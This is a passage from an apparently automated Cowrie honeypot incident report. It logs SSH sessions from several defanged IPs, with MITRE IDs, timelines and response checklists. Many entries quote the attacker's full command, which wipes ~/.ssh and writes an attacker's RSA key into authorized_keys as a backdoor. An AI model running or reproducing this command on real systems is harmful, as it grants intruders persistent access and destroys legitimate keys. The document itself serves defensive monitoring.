| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:49:52` | `cowrie.session.connect` |
| `2026-04-13 15:49:52` | `cowrie.client.version` |
| `2026-04-13 15:49:52` | `cowrie.client.kex` |
| `2026-04-13 15:49:53` | `cowrie.login.success` |
| `2026-04-13 15:49:53` | `cowrie.session.params` |
| `2026-04-13 15:49:53` | `cowrie.command.input` |
| `2026-04-13 15:49:53` | `cowrie.command.failed` |
| `2026-04-13 15:49:53` | `cowrie.log.closed` |
| `2026-04-13 15:49:54` | `cowrie.session.params` |
| `2026-04-13 15:49:54` | `cowrie.command.input` |
| `2026-04-13 15:49:54` | `cowrie.session.file_download` |
| `2026-04-13 15:49:54` | `cowrie.log.closed` |
| `2026-04-13 15:49:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.143.141[.]37` to AbuseIPDB if not already reported
- [ ] Block `94.143.141[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1537462879c

| Field | Detail |
|---|---|
| **Source IP** | `94.143.141[.]37` |
| **First Seen** | 2026-04-13 15:49 |
| **Last Seen** | 2026-04-13 15:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:49:56` | `cowrie.session.connect` |
| `2026-04-13 15:49:56` | `cowrie.client.version` |
| `2026-04-13 15:49:56` | `cowrie.client.kex` |
| `2026-04-13 15:49:57` | `cowrie.login.success` |
| `2026-04-13 15:49:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.143.141[.]37` to AbuseIPDB if not already reported
- [ ] Block `94.143.141[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f70c79cf81cc

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-04-13 15:50 |
| **Last Seen** | 2026-04-13 15:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:50:54` | `cowrie.session.connect` |
| `2026-04-13 15:50:54` | `cowrie.client.version` |
| `2026-04-13 15:50:54` | `cowrie.client.kex` |
| `2026-04-13 15:50:54` | `cowrie.login.success` |
| `2026-04-13 15:50:55` | `cowrie.session.params` |
| `2026-04-13 15:50:55` | `cowrie.command.input` |
| `2026-04-13 15:50:55` | `cowrie.command.failed` |
| `2026-04-13 15:50:55` | `cowrie.log.closed` |
| `2026-04-13 15:50:55` | `cowrie.session.params` |
| `2026-04-13 15:50:55` | `cowrie.command.input` |
| `2026-04-13 15:50:55` | `cowrie.session.file_download` |
| `2026-04-13 15:50:55` | `cowrie.log.closed` |
| `2026-04-13 15:50:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c803888cf064

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-04-13 15:50 |
| **Last Seen** | 2026-04-13 15:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:50:57` | `cowrie.session.connect` |
| `2026-04-13 15:50:57` | `cowrie.client.version` |
| `2026-04-13 15:50:57` | `cowrie.client.kex` |
| `2026-04-13 15:50:57` | `cowrie.login.success` |
| `2026-04-13 15:50:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc2cc9989856

| Field | Detail |
|---|---|
| **Source IP** | `94.143.141[.]37` |
| **First Seen** | 2026-04-13 15:51 |
| **Last Seen** | 2026-04-13 15:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:51:34` | `cowrie.session.connect` |
| `2026-04-13 15:51:34` | `cowrie.client.version` |
| `2026-04-13 15:51:35` | `cowrie.client.kex` |
| `2026-04-13 15:51:35` | `cowrie.login.success` |
| `2026-04-13 15:51:36` | `cowrie.session.params` |
| `2026-04-13 15:51:36` | `cowrie.command.input` |
| `2026-04-13 15:51:36` | `cowrie.command.failed` |
| `2026-04-13 15:51:36` | `cowrie.log.closed` |
| `2026-04-13 15:51:36` | `cowrie.session.params` |
| `2026-04-13 15:51:36` | `cowrie.command.input` |
| `2026-04-13 15:51:36` | `cowrie.session.file_download` |
| `2026-04-13 15:51:36` | `cowrie.log.closed` |
| `2026-04-13 15:51:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.143.141[.]37` to AbuseIPDB if not already reported
- [ ] Block `94.143.141[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b28b9e25c53

| Field | Detail |
|---|---|
| **Source IP** | `94.143.141[.]37` |
| **First Seen** | 2026-04-13 15:51 |
| **Last Seen** | 2026-04-13 15:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:51:38` | `cowrie.session.connect` |
| `2026-04-13 15:51:38` | `cowrie.client.version` |
| `2026-04-13 15:51:39` | `cowrie.client.kex` |
| `2026-04-13 15:51:39` | `cowrie.login.success` |
| `2026-04-13 15:51:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.143.141[.]37` to AbuseIPDB if not already reported
- [ ] Block `94.143.141[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-356b1325f148

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-04-13 15:52 |
| **Last Seen** | 2026-04-13 15:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:52:41` | `cowrie.session.connect` |
| `2026-04-13 15:52:41` | `cowrie.client.version` |
| `2026-04-13 15:52:41` | `cowrie.client.kex` |
| `2026-04-13 15:52:42` | `cowrie.login.success` |
| `2026-04-13 15:52:42` | `cowrie.session.params` |
| `2026-04-13 15:52:42` | `cowrie.command.input` |
| `2026-04-13 15:52:42` | `cowrie.command.failed` |
| `2026-04-13 15:52:42` | `cowrie.log.closed` |
| `2026-04-13 15:52:42` | `cowrie.session.params` |
| `2026-04-13 15:52:42` | `cowrie.command.input` |
| `2026-04-13 15:52:42` | `cowrie.session.file_download` |
| `2026-04-13 15:52:42` | `cowrie.log.closed` |
| `2026-04-13 15:52:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd4a726ec968

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-04-13 15:52 |
| **Last Seen** | 2026-04-13 15:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:52:44` | `cowrie.session.connect` |
| `2026-04-13 15:52:44` | `cowrie.client.version` |
| `2026-04-13 15:52:44` | `cowrie.client.kex` |
| `2026-04-13 15:52:45` | `cowrie.login.success` |
| `2026-04-13 15:52:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f781ebfc8ca

| Field | Detail |
|---|---|
| **Source IP** | `156.227.232[.]96` |
| **First Seen** | 2026-04-13 15:53 |
| **Last Seen** | 2026-04-13 15:54 |
| **Session Duration** | 58s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:53:28` | `cowrie.session.connect` |
| `2026-04-13 15:53:28` | `cowrie.client.version` |
| `2026-04-13 15:53:28` | `cowrie.client.kex` |
| `2026-04-13 15:53:28` | `cowrie.login.success` |
| `2026-04-13 15:54:26` | `cowrie.session.file_upload` |
| `2026-04-13 15:54:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.227.232[.]96` to AbuseIPDB if not already reported
- [ ] Block `156.227.232[.]96` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f9fc1a7496c

| Field | Detail |
|---|---|
| **Source IP** | `87.106.46[.]37` |
| **First Seen** | 2026-04-13 15:54 |
| **Last Seen** | 2026-04-13 15:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:54:12` | `cowrie.session.connect` |
| `2026-04-13 15:54:12` | `cowrie.client.version` |
| `2026-04-13 15:54:12` | `cowrie.client.kex` |
| `2026-04-13 15:54:13` | `cowrie.login.success` |
| `2026-04-13 15:54:13` | `cowrie.session.params` |
| `2026-04-13 15:54:13` | `cowrie.command.input` |
| `2026-04-13 15:54:13` | `cowrie.command.failed` |
| `2026-04-13 15:54:13` | `cowrie.log.closed` |
| `2026-04-13 15:54:14` | `cowrie.session.params` |
| `2026-04-13 15:54:14` | `cowrie.command.input` |
| `2026-04-13 15:54:14` | `cowrie.session.file_download` |
| `2026-04-13 15:54:14` | `cowrie.log.closed` |
| `2026-04-13 15:54:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.46[.]37` to AbuseIPDB if not already reported
- [ ] Block `87.106.46[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d4fc19afcc1

| Field | Detail |
|---|---|
| **Source IP** | `87.106.46[.]37` |
| **First Seen** | 2026-04-13 15:54 |
| **Last Seen** | 2026-04-13 15:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:54:16` | `cowrie.session.connect` |
| `2026-04-13 15:54:16` | `cowrie.client.version` |
| `2026-04-13 15:54:16` | `cowrie.client.kex` |
| `2026-04-13 15:54:17` | `cowrie.login.success` |
| `2026-04-13 15:54:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.46[.]37` to AbuseIPDB if not already reported
- [ ] Block `87.106.46[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f12c33043346

| Field | Detail |
|---|---|
| **Source IP** | `94.143.141[.]37` |
| **First Seen** | 2026-04-13 15:55 |
| **Last Seen** | 2026-04-13 15:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:55:01` | `cowrie.session.connect` |
| `2026-04-13 15:55:01` | `cowrie.client.version` |
| `2026-04-13 15:55:01` | `cowrie.client.kex` |
| `2026-04-13 15:55:02` | `cowrie.login.success` |
| `2026-04-13 15:55:02` | `cowrie.session.params` |
| `2026-04-13 15:55:02` | `cowrie.command.input` |
| `2026-04-13 15:55:02` | `cowrie.command.failed` |
| `2026-04-13 15:55:02` | `cowrie.log.closed` |
| `2026-04-13 15:55:03` | `cowrie.session.params` |
| `2026-04-13 15:55:03` | `cowrie.command.input` |
| `2026-04-13 15:55:03` | `cowrie.session.file_download` |
| `2026-04-13 15:55:03` | `cowrie.log.closed` |
| `2026-04-13 15:55:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.143.141[.]37` to AbuseIPDB if not already reported
- [ ] Block `94.143.141[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14dae7c52b7e

| Field | Detail |
|---|---|
| **Source IP** | `94.143.141[.]37` |
| **First Seen** | 2026-04-13 15:55 |
| **Last Seen** | 2026-04-13 15:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:55:05` | `cowrie.session.connect` |
| `2026-04-13 15:55:05` | `cowrie.client.version` |
| `2026-04-13 15:55:05` | `cowrie.client.kex` |
| `2026-04-13 15:55:06` | `cowrie.login.success` |
| `2026-04-13 15:55:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.143.141[.]37` to AbuseIPDB if not already reported
- [ ] Block `94.143.141[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c237f6fb556

| Field | Detail |
|---|---|
| **Source IP** | `94.143.141[.]37` |
| **First Seen** | 2026-04-13 15:56 |
| **Last Seen** | 2026-04-13 15:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:56:41` | `cowrie.session.connect` |
| `2026-04-13 15:56:41` | `cowrie.client.version` |
| `2026-04-13 15:56:41` | `cowrie.client.kex` |
| `2026-04-13 15:56:41` | `cowrie.login.success` |
| `2026-04-13 15:56:42` | `cowrie.session.params` |
| `2026-04-13 15:56:42` | `cowrie.command.input` |
| `2026-04-13 15:56:42` | `cowrie.command.failed` |
| `2026-04-13 15:56:42` | `cowrie.log.closed` |
| `2026-04-13 15:56:42` | `cowrie.session.params` |
| `2026-04-13 15:56:42` | `cowrie.command.input` |
| `2026-04-13 15:56:42` | `cowrie.session.file_download` |
| `2026-04-13 15:56:42` | `cowrie.log.closed` |
| `2026-04-13 15:56:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.143.141[.]37` to AbuseIPDB if not already reported
- [ ] Block `94.143.141[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af2c4bfc733a

| Field | Detail |
|---|---|
| **Source IP** | `94.143.141[.]37` |
| **First Seen** | 2026-04-13 15:56 |
| **Last Seen** | 2026-04-13 15:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:56:45` | `cowrie.session.connect` |
| `2026-04-13 15:56:45` | `cowrie.client.version` |
| `2026-04-13 15:56:45` | `cowrie.client.kex` |
| `2026-04-13 15:56:45` | `cowrie.login.success` |
| `2026-04-13 15:56:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.143.141[.]37` to AbuseIPDB if not already reported
- [ ] Block `94.143.141[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26dd68696d5b

| Field | Detail |
|---|---|
| **Source IP** | `87.106.46[.]37` |
| **First Seen** | 2026-04-13 15:57 |
| **Last Seen** | 2026-04-13 15:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:57:39` | `cowrie.session.connect` |
| `2026-04-13 15:57:39` | `cowrie.client.version` |
| `2026-04-13 15:57:39` | `cowrie.client.kex` |
| `2026-04-13 15:57:39` | `cowrie.login.success` |
| `2026-04-13 15:57:40` | `cowrie.session.params` |
| `2026-04-13 15:57:40` | `cowrie.command.input` |
| `2026-04-13 15:57:40` | `cowrie.command.failed` |
| `2026-04-13 15:57:40` | `cowrie.log.closed` |
| `2026-04-13 15:57:40` | `cowrie.session.params` |
| `2026-04-13 15:57:40` | `cowrie.command.input` |
| `2026-04-13 15:57:40` | `cowrie.session.file_download` |
| `2026-04-13 15:57:40` | `cowrie.log.closed` |
| `2026-04-13 15:57:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.46[.]37` to AbuseIPDB if not already reported
- [ ] Block `87.106.46[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13f4f943c603

| Field | Detail |
|---|---|
| **Source IP** | `87.106.46[.]37` |
| **First Seen** | 2026-04-13 15:57 |
| **Last Seen** | 2026-04-13 15:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:57:42` | `cowrie.session.connect` |
| `2026-04-13 15:57:42` | `cowrie.client.version` |
| `2026-04-13 15:57:43` | `cowrie.client.kex` |
| `2026-04-13 15:57:43` | `cowrie.login.success` |
| `2026-04-13 15:57:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.46[.]37` to AbuseIPDB if not already reported
- [ ] Block `87.106.46[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e972f0cce2ce

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-04-13 15:58 |
| **Last Seen** | 2026-04-13 15:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:58:11` | `cowrie.session.connect` |
| `2026-04-13 15:58:11` | `cowrie.client.version` |
| `2026-04-13 15:58:11` | `cowrie.client.kex` |
| `2026-04-13 15:58:12` | `cowrie.login.success` |
| `2026-04-13 15:58:12` | `cowrie.session.params` |
